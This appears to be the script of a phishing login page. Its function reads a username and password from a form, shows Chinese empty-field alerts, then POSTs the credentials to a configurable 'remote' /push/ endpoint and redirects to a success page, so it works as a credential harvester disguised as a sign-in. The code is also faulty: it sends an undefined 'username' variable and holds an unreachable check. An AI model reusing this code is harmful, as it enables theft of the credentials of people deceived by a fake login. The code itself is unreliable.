function logon(){
    var password = document.getElementById("pwd").value;
    var usersname = document.getElementById("usersname").value;
    if(password == ""){
        alert("密码不可为空")
        return false
    }
    if (usersname == "") {
        alert("用户名不可为空")
        return false
    }
    if (usersname == "" && password == "") {
        alert("用户名和密码不可为空")
        return false
    }
    else {
        var url = window.location.href;
        var xhr = new XMLHttpRequest();
        xhr.open('POST', remote+"/push/"+url.substring(remote.length).replace("/","")+"/", true);
        xhr.send(JSON.stringify({"content":"用户名: "+username+" 密码: "+password}));
    
        xhr.onload = function() {
            window.location.href = "/resource/other/ok.html"
        };
    }
}
function onload() {

}